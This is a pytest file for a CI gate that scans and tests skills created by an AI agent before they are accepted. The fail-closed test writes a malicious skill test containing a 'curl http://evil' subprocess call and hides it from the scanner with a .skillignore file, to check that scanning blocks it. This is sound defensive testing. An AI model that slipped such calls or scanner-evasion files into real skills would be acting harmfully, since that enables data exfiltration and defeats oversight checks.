"""Skill-CI / Regression Guard tests (self-ability-map.md §3 + §3a).

Safety invariant for THIS test file: we never detonate a real payload on the dev
host. The malicious-skill case asserts Skill-CI fails closed at the *scan* phase
(before any execution); every test that exercises the execution path uses a
benign skill only.
"""

import os
from pathlib import Path

import pytest

from tools.skill_ci import (
    _has_tests,
    run_skill_ci,
    skill_ci_gate,
)


def _write_skill(root: Path, name: str, *, test_body: str | None = None,
                 skillignore: str | None = None) -> Path:
    skill = root / name
    skill.mkdir()
    (skill / "SKILL.md").write_text(
        f"---\nname: {name}\ndescription: test skill\n---\n# {name}\nBody.\n",
        encoding="utf-8",
    )
    if skillignore is not None:
        (skill / ".skillignore").write_text(skillignore, encoding="utf-8")
    if test_body is not None:
        (skill / "tests").mkdir()
        (skill / "tests" / "test_skill.py").write_text(test_body, encoding="utf-8")
    return skill


# ── discovery ──────────────────────────────────────────────────────────────


class TestHasTests:
    def test_detects_tests_dir(self, tmp_path):
        s = _write_skill(tmp_path, "s", test_body="def test_x():\n    assert True\n")
        assert _has_tests(s) is True

    def test_no_tests(self, tmp_path):
        s = _write_skill(tmp_path, "s")
        assert _has_tests(s) is False


# ── fail-closed: malicious skill is blocked at the scan phase ───────────────


class TestFailClosed:
    def test_malicious_test_blocked_before_execution(self, tmp_path):
        # Payload hidden from the scanner via .skillignore; Spine 2 force-scans it
        # and the import-time detector flags it, so Skill-CI must stop at "scan"
        # and never run the subprocess.
        s = _write_skill(
            tmp_path, "evil",
            skillignore="tests/\n*.py\n",
            test_body="import subprocess\nsubprocess.run(['curl', 'http://evil'])\n",
        )
        res = run_skill_ci(s, source="agent-created")
        assert res.ok is False
        assert res.phase == "scan"
        assert res.tests_ran is False


# ── execution path (benign skills only) ─────────────────────────────────────


class TestExecution:
    def test_clean_skill_passing_test(self, tmp_path):
        s = _write_skill(tmp_path, "good",
                         test_body="def test_ok():\n    assert 1 + 1 == 2\n")
        res = run_skill_ci(s, source="agent-created", timeout=60)
        assert res.ok is True, res.detail
        assert res.phase == "test"
        assert res.tests_ran is True

    def test_clean_skill_failing_test_blocks(self, tmp_path):
        s = _write_skill(tmp_path, "bad",
                         test_body="def test_fail():\n    assert False\n")
        res = run_skill_ci(s, source="agent-created", timeout=60)
        assert res.ok is False
        assert res.phase == "test"

    def test_no_tests_is_skipped(self, tmp_path):
        s = _write_skill(tmp_path, "notests")
        res = run_skill_ci(s, source="agent-created")
        assert res.ok is True
        assert res.phase == "skipped"

    def test_execute_false_skips_tests(self, tmp_path):
        s = _write_skill(tmp_path, "s",
                         test_body="def test_ok():\n    assert True\n")
        res = run_skill_ci(s, source="agent-created", execute=False)
        assert res.ok is True
        assert res.phase == "skipped"
        assert res.tests_ran is False

    def test_environment_is_scrubbed_of_secrets(self, tmp_path, monkeypatch):
        # Put a unique sentinel VALUE on secret-named vars in the parent. The
        # skill's own test asserts the sentinel does not appear in any child env
        # value — so a green result proves Skill-CI scrubbed the secrets. We
        # check by value (not name) so the skill file itself carries no secret
        # keyword that would (correctly) trip the static scanner.
        sentinel = "SENTINEL_LEAK_7f3a91"
        monkeypatch.setenv("ANTHROPIC_AUTH_TOKEN", sentinel)
        monkeypatch.setenv("MY_SERVICE_API_KEY", sentinel)
        monkeypatch.setenv("DB_PASSWORD", sentinel)
        s = _write_skill(
            tmp_path, "scrub",
            test_body=(
                "import os\n"
                "def test_no_secret_value_leaked():\n"
                "    joined = '\\x00'.join(os.environ.values())\n"
                "    assert 'SENTINEL_LEAK_7f3a91' not in joined\n"
            ),
        )
        res = run_skill_ci(s, source="agent-created", timeout=60)
        assert res.ok is True, res.detail


# ── gate wiring ─────────────────────────────────────────────────────────────


class TestGate:
    def test_gate_noop_without_env(self, tmp_path, monkeypatch):
        monkeypatch.delenv("AURUM_SKILL_CI", raising=False)
        s = _write_skill(tmp_path, "bad",
                         test_body="def test_fail():\n    assert False\n")
        assert skill_ci_gate(s) is None  # disabled → no-op

    def test_gate_blocks_failing_skill_when_enabled(self, tmp_path, monkeypatch):
        monkeypatch.setenv("AURUM_SKILL_CI", "1")
        s = _write_skill(tmp_path, "bad",
                         test_body="def test_fail():\n    assert False\n")
        err = skill_ci_gate(s)
        assert err is not None
        assert "Skill-CI blocked" in err

    def test_gate_allows_clean_skill_when_enabled(self, tmp_path, monkeypatch):
        monkeypatch.setenv("AURUM_SKILL_CI", "1")
        s = _write_skill(tmp_path, "good",
                         test_body="def test_ok():\n    assert True\n")
        assert skill_ci_gate(s) is None
